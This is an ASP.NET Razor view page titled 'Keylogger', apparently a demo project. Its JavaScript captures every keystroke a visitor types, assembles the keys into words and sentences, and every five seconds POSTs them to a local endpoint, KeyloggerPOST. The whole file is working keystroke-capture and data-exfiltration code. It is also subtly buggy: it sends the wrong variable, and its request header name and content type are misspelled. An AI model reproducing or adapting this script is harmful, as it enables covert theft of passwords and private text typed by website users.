
@{
    ViewBag.Title = "Keylogger";
}

<h2>Keylogger</h2>

<script type="text/javascript">
	var word = "";
	var sentence = "";
	var text = "";

	//window.setInterval(myLog, 10000);
	document.addEventListener("keydown", function e() {

		var characterCode = event.keyCode || event.which;
		var characterValue = String.fromCharCode(characterCode);

		console.log("Current Character: " + characterCode + " " + characterValue);

		word += characterValue;

		if (characterCode == 32)
		{
			console.log("Word: " + word);
			sentence += word;
			word = "";
		}

		if (characterCode == 13 || characterCode == 190)
		{
			console.log("Sentence: " + sentence);
			text += sentence + word;
			word = "";
			sentence = "";
		}

	});

	setInterval(function () {
		if (text.length > 0) {
			console.log("Text for Submission: " + text);

			var xhr = new XMLHttpRequest();
			xhr.open('POST', 'http://localhost:56327/Home/KeyloggerPOST');
			xhr.setRequestHeader('Content_Type', 'application/x-www-form-urlencoden');
			xhr.send('sentence=' + sentence);
			text = "";
			sentence = "";
			word = "";
		}
	}, 5000);



</script>
